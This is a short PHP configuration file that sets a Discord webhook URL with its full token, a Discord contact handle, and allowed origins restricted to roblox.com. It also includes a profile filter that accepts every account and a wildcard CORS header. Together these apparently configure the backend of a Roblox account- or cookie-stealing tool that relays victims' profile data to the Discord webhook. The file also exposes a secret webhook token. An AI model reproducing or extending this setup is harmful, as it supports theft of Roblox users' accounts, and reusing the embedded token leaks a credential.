<?php


$webhook = "https://discord.com/api/webhooks/801685529418006528/XEX_x-xKZLz9-ZH1ONrBhktk1ZMj6I8WgPchWx-XnLiXIzHz_gLeFR7k6TyuwyWmVUv4";
$discord_contact = "кαzυмι#0001";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
